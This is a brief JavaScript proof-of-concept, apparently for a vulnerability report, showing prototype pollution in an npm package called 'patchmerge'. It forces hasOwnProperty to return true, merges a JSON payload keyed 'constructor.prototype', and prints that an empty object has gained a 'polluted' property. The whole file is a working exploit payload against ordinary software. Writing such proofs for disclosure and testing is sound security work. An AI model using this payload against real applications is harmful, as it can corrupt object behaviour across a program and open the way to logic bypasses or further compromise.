Object.prototype.hasOwnProperty = () => true;
const patchMerge = require('patchmerge');
console.log({}.polluted);
let obj = {};
patchMerge(obj, JSON.parse('{"constructor.prototype": {"polluted":"yes"}}'));
console.log({}.polluted);